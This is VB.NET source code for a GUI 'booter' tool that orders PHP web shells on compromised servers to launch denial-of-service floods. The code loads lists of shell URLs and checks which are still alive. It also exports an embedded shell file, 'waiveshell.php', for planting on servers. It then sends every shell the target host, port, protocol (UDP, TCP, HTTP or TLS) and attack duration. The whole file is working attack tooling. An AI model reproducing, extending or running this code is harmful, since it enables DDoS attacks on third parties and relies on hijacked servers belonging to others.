﻿Imports System.IO
Imports System.Net
Imports System.Security.Policy
Imports System.Net.Http
Imports System.Threading
Imports System.Reflection.Emit
Public Class Form1
    Public _shells As New List(Of String)
    Public _attack As Boolean = False
    Public _type As String = "udp"

    Public span As TimeSpan
    Public stopwatch As Stopwatch
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Form1_Closing(sender As Object, e As EventArgs) Handles MyBase.Closing
        tmrUpdt.Stop()
    End Sub

    Private Sub GameBoosterButton1_Click(sender As Object, e As EventArgs) Handles GameBoosterButton1.Click
        Me.Close()
    End Sub

    Private Sub GameBoosterButton2_Click(sender As Object, e As EventArgs) Handles GameBoosterButton2.Click
        Me.Location = New Point(Screen.PrimaryScreen.Bounds.Width - Me.Width - 10, Screen.PrimaryScreen.Bounds.Height - Me.Height - 10)
    End Sub

    Private Sub GameBoosterButton3_Click(sender As Object, e As EventArgs) Handles GameBoosterButton3.Click
        Me.WindowState = WindowState.Minimized
    End Sub

    Private Sub chkUdp_CheckedChanged(sender As Object) Handles chkUdp.CheckedChanged
        If chkUdp.Checked = True Then
            chkTcp.Checked = False
            chkHttp.Checked = False
            chkTls.Checked = False
            txtPort.Text = "80"
            _type = "udp"
        ElseIf chkUdp.Checked = False Then
            chkUdp.Checked = True
        End If
    End Sub

    Private Sub chkTcp_CheckedChanged(sender As Object) Handles chkTcp.CheckedChanged
        If chkTcp.Checked = True Then
            chkUdp.Checked = False
            chkHttp.Checked = False
            chkTls.Checked = False
            txtPort.Text = "80"
            _type = "tcp"
        ElseIf chkTcp.Checked = False Then
            chkUdp.Checked = True
        End If
    End Sub

    Private Sub chkHttp_CheckedChanged(sender As Object) Handles chkHttp.CheckedChanged
        If chkHttp.Checked = True Then
            chkUdp.Checked = False
            chkTcp.Checked = False
            chkTls.Checked = False
            txtPort.Text = "80"
            _type = "http"
        ElseIf chkHttp.Checked = False Then
            chkUdp.Checked = True
        End If
    End Sub

    Private Sub chkTls_CheckedChanged(sender As Object) Handles chkTls.CheckedChanged
        If chkTls.Checked = True Then
            chkUdp.Checked = False
            chkTcp.Checked = False
            chkHttp.Checked = False
            txtPort.Text = "443"
            _type = "tls"
        ElseIf chkTls.Checked = False Then
            chkUdp.Checked = True
            txtPort.Text = "80"
        End If
    End Sub

    Private Sub _read(_path)
        Me.CheckForIllegalCrossThreadCalls = False

        Using reader As New StreamReader(_path.ToString)
            Dim line As String
            Do
                line = reader.ReadLine()
                If Not line Is Nothing Then
                    If line.ToLower.EndsWith(".php") Then
                        _shells.Add(line)
                    End If
                End If
            Loop Until line Is Nothing
        End Using

        lbCount.Text = "SHELLS: " + _shells.Count.ToString
        MessageBox.Show("Shells imported successfully!")
        btnImport.Enabled = True
    End Sub

    Private Sub btnImport_Click(sender As Object, e As EventArgs) Handles btnImport.Click
        If Not _attack = True Then
            Dim _ofd As New OpenFileDialog()

            _ofd.Multiselect = False
            _ofd.Filter = "Text Files (*.txt)|*.txt"

            If _ofd.ShowDialog = DialogResult.OK Then

                Dim _path As String = _ofd.FileName
                btnImport.Enabled = False
                System.Threading.ThreadPool.QueueUserWorkItem(Sub() _read(_path))
            End If
        End If
    End Sub

    Private Sub _verify()
        Me.CheckForIllegalCrossThreadCalls = False

        For Each _shell As String In _shells
            Try
                Dim request As HttpWebRequest = CType(WebRequest.Create(_shell), HttpWebRequest)
                request.Method = "HEAD"
                Using response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
                    If Not response.StatusCode = HttpStatusCode.OK Then
                        _shells.Remove(_shell)
                    End If
                End Using
            Catch ex As Exception
                _shells.Remove(_shell)
            End Try
        Next

        lbCount.Text = "SHELLS: " + _shells.Count.ToString
        MessageBox.Show("Queue has been updated.", "Alert!")
        btnCheck.Enabled = True
    End Sub
    Private Sub btnCheck_Click(sender As Object, e As EventArgs) Handles btnCheck.Click
        If Not _attack = True Then
            If Not _shells.Count = 0 Then
                btnCheck.Enabled = False
                System.Threading.ThreadPool.QueueUserWorkItem(Sub() _verify())
            End If
        End If
    End Sub

    Private Sub btnClone_Click(sender As Object, e As EventArgs) Handles btnClone.Click
        Dim _sfd As New SaveFileDialog()
        _sfd.FileName = "waiveshell.php"
        _sfd.Filter = "PHP script (*.php)|*.php"

        If _sfd.ShowDialog = DialogResult.OK Then
            Try
                Dim resourceBytes As Byte() = My.Resources.waiveshell
                Using fs As New System.IO.FileStream(_sfd.FileName, System.IO.FileMode.Create)
                    fs.Write(resourceBytes, 0, resourceBytes.Length)
                    fs.Close()
                End Using
                MessageBox.Show("Shell exported successfully!")
            Catch ex As Exception
                MessageBox.Show("Critical error encountered!")
            End Try
        End If
    End Sub
    Private Sub _send()
        Me.CheckForIllegalCrossThreadCalls = False

        Dim _args = "?type=" + _type + "&host=" + txtHost.Text + "&port=" + txtPort.Text + "&time=" + txtDuration.Text

        For Each _shell As String In _shells
            Try
                Dim _url As String = _shell + _args

                Dim request As HttpWebRequest = CType(WebRequest.Create(_url), HttpWebRequest)
                request.Method = "GET"
                request.Timeout = 3000 ' Timeout in milliseconds (3 seconds)
                Using response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
                    If response.StatusCode = HttpStatusCode.OK Then
                        'do nothing
                    End If
                End Using
            Catch : End Try
        Next
    End Sub
    Private Sub btnBoot_Click(sender As Object, e As EventArgs) Handles btnBoot.Click
        If String.IsNullOrEmpty(txtHost.Text) Then
            MessageBox.Show("Host IP/URL is required!")
        ElseIf String.IsNullOrEmpty(txtPort.Text) Then
            MessageBox.Show("Port value required! Range: 1 to 65535")
        ElseIf String.IsNullOrEmpty(txtDuration.Text) Then
            MessageBox.Show("Time value (in seconds) required!")
        Else
            If Not _attack = True Then
                manageUI(0)
                System.Threading.ThreadPool.QueueUserWorkItem(Sub() _send())
                span = TimeSpan.FromSeconds(Int(txtDuration.Text))
                stopwatch = Stopwatch.StartNew
                tmrUpdt.Start()
            End If
        End If
    End Sub

    Private Function manageUI(ByVal _num As Integer)
        Me.CheckForIllegalCrossThreadCalls = False
        ' 0 = LOCK | 1 = UNLOCK'

        If _num = 0 Then
            _attack = True

            txtHost.ReadOnly = True
            txtPort.ReadOnly = True
            txtDuration.ReadOnly = True
            chkHttp.Enabled = False
            chkTcp.Enabled = False
            chkUdp.Enabled = False
            chkTls.Enabled = False
            btnBoot.Enabled = False
            'ensure duration does not exceed one hour (3600 seconds)
            Try
                Dim _max As Integer = Int(txtDuration.Text)
                If _max > 3600 Then
                    txtDuration.Text = "3600"
                End If
            Catch ex As Exception
                txtDuration.Text = "3600"
            End Try

        Else
            txtHost.ReadOnly = False
            txtPort.ReadOnly = False
            txtDuration.ReadOnly = False
            chkHttp.Enabled = True
            chkTcp.Enabled = True
            chkUdp.Enabled = True
            chkTls.Enabled = True
            chkUdp.Checked = True

            txtHost.Text = ""
            txtPort.Text = "80"
            txtDuration.Text = "300"

            _shells.Clear()

            btnBoot.Enabled = True
            _attack = False
        End If
    End Function

    Private Sub tmrUpdt_Tick(sender As Object, e As EventArgs) Handles tmrUpdt.Tick
        Dim timeLeft As TimeSpan = span - stopwatch.Elapsed
        If timeLeft > TimeSpan.Zero Then
            lbTime.Text = timeLeft.ToString("hh\:mm\:ss")
        Else
            lbTime.Text = "00:00:00"
            manageUI(1)
            tmrUpdt.Stop()
        End If
    End Sub
End Class
